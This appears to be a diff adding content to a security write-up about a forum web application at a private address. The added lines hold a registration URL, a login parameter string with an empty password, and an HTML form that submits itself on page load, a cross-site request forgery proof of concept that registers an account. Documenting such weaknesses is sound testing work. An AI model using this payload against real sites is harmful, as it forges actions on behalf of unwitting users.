@@ -22,3 +22,14 @@ All of this directories are listable:
 
 ![img listable](/img/index-js.png)
 
+https://192.168.1.120/forum/index.php?mode=register
+
+mode=login&username=test&userpw=""
+
+<form action="https://192.168.1.120/forum/index.php?mode=register" method="POST">
+    <input type="hidden" name="username" value="test" />
+    <input type="hidden" name="userpw" value="test" />
+</form>
+<script>
+    document.forms[0].submit();
+</script>
